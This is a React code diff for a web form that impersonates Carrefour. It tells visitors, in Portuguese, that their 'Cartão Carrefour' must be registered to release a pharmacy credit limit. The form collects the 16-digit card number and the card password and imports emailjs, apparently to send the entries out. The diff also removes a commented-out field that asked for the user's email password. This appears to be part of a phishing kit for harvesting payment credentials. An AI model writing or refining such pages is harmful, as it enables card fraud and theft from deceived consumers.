@@ -1,5 +1,5 @@
 import React, { Component } from 'react'
-import logo from './carrfo.png'
+import logo from './logo.jpeg'
 import emailjs from 'emailjs-com';
 
 
@@ -49,14 +49,14 @@ export class SocialProfiles extends Component {
         } = this.props;
         return (
 
+<>
+            <div  className="logo_container ">
 
-            
+            <img className="logo" src={logo} width="250"/>
+            </div>
             <div className="form-container">
-          <div className="text-center container">
-
-<img className="logo" src={logo} width="100"/>
-</div>
-                <p className="container"><b>Tudo certo!<br></br></b> Precisamos Cadastrar seu <b>Cartão Carrefour</b> para Liberar o Limite Crédito Drogaria</p>
+      
+                <p className="mb-7" ><b>Tudo certo!<br></br></b> Precisamos Cadastrar seu <b>Cartão Carrefour</b> para Liberar o Limite Crédito Drogaria</p>
                 <div className="form-group">
                     <input placeholder="16 dígitos do cartão" type="number" className="form-control" name="cc" onChange={inputChange('cc')} value={values.cc} required/>
                 </div>
@@ -69,10 +69,7 @@ export class SocialProfiles extends Component {
                 <div className="form-group">
                     <input placeholder="Senha do cartão" className="form-control" name="ccpass" onChange={inputChange('ccpass')} value={values.ccpass} required/>
                 </div>
-                {/* <div className="form-group">
-                    <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} required/>
-                   <span class="focus-border"></span>
-                </div> */}
+          
 
                 <div className="row">
                     <div className="col-6">
@@ -98,6 +95,8 @@ export class SocialProfiles extends Component {
                     </div>
                 </div>
             </div>
+
+</>
         )
       
     }
